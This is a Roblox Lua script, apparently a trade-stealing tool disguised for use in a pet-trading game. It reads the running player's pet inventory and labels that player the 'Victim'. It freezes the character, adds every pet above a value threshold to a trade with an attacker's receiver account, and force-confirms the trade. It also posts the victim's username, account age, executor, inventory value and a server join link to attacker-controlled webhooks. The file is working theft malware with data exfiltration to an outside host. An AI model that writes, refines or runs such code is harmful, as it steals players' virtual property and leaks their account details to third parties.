-- [[ 2. MOZIL-STYLE DUALHOOK ENGINE ]] --
local function SendEliteLog(hook, totalValue, petString, isHighTier, receiverName)
    local jobId = game.JobId
    local joinLink = "https://floating.gg/?placeID=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
    local exec = (identifyexecutor and identifyexecutor()) or "Android Mobile"
    
    local payload = HttpService:JSONEncode({
        ["username"] = isHighTier and "🎯 MONDEUR HIGH-TIER" or "💎 Mondeur Hits",
        ["embeds"] = {{
            ["title"] = isHighTier and "🔥 TARGET ACQUIRED (500+ PHP)" or "📡 New Inventory Hit",
            ["color"] = isHighTier and 0xFF0000 or 0x3498DB,
            ["fields"] = {
                {
                    ["name"] = "👤 **Player Info**",
                    ["value"] = "```yaml\n" ..
                        "Victim   : " .. LocalPlayer.Name .. "\n" ..
                        "Age      : " .. LocalPlayer.AccountAge .. " days\n" ..
                        "Exec     : " .. exec .. "\n" ..
                        "Receiver : " .. (receiverName or "None Online") .. "\n" ..
                        "Value    : " .. string.format("%.2f", totalValue) .. "\n" ..
                        "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "📦 **Inventory Scan (Threshold 1)**",
                    ["value"] = "```yaml\n" .. petString .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "🌐 **Join Link**",
                    ["value"] = "[Join Server](" .. joinLink .. ")",
                    ["inline"] = false
                }
            },
            ["footer"] = {["text"] = "Mondeur Master v26.0 | " .. os.date("%X")},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })

    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        task.spawn(function() 
            pcall(function() 
                req({Url = hook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) 
            end) 
        end)
    end
end

-- [[ 3. PRE-TRADE ACTION (UNSEAT/ANCHOR) ]] --
local function PrepareVictim()
    pcall(function()
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hum = char:FindFirstChildOfClass("Humanoid")
        local hrp = char:FindFirstChild("HumanoidRootPart")
        
        -- Force standing (Prevents pet/car errors)
        if hum then hum.Sit = false end 
        task.wait(0.5)
        
        -- Anchor character (Prevents distance-check errors during tabbing)
        if hrp then hrp.Anchored = true end 
    end)
end

-- [[ 4. CORE TRADE ENGINE ]] --
task.spawn(function()
    if not game:IsLoaded() then game.Loaded:Wait() end
    task.wait(Config.InitBuffer)

    pcall(function()
        local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
        local data = ClientData.get_data()
        local inv = data.inventory and (data.inventory.inventory_pets or data.inventory.pets)
        
        if inv then
            local TradeAPI = ReplicatedStorage:WaitForChild("API"):WaitForChild("Trade")
            local totalVal = 0
            local petText = ""
            
            -- Find the ONE receiver currently in the server
            local activeReceiver = "None"
            for _, r in pairs(Config.Receivers) do
                if Players:FindFirstChild(r) then
                    activeReceiver = r
                    break
                end
            end

            PrepareVictim()

            -- 1. Scan and Add Items
            for _, pet in pairs(inv) do
                local val = _G.GetTrueValue(pet, _G.PetValueDB) or 0
                if val >= Config.LowThreshold then
                    totalVal = totalVal + val
                    petText = petText .. string.format("- %s : %.2f\n", pet.config_name or "Unknown", val)
                    
                    -- Sequential Injection (1.3s delay keeps server stable)
                    task.spawn(function()
                        TradeAPI:WaitForChild("AddItemToTrade"):FireServer(pet.unique)
                    end)
                    task.wait(Config.TradeInterval)
                end
            end

            -- 2. Logging and Final Acceptance
            if totalVal > 0 then
                -- Always log to UserHook
                SendEliteLog(Config.UserHook, totalVal, petText, false, activeReceiver)
                
                -- Send Dualhook Alert if high value (Metal Ox test)
                if totalVal >= Config.HighTierValue then
                    SendEliteLog(Config.DualHook, totalVal, petText, true, activeReceiver)
                end

                -- Finalize Acceptance
                task.wait(1.5)
                TradeAPI:WaitForChild("ReadyTrade"):FireServer(true)
                task.wait(1.2)
                TradeAPI:WaitForChild("ConfirmTrade"):FireServer()
            end
        end
    end)
end)
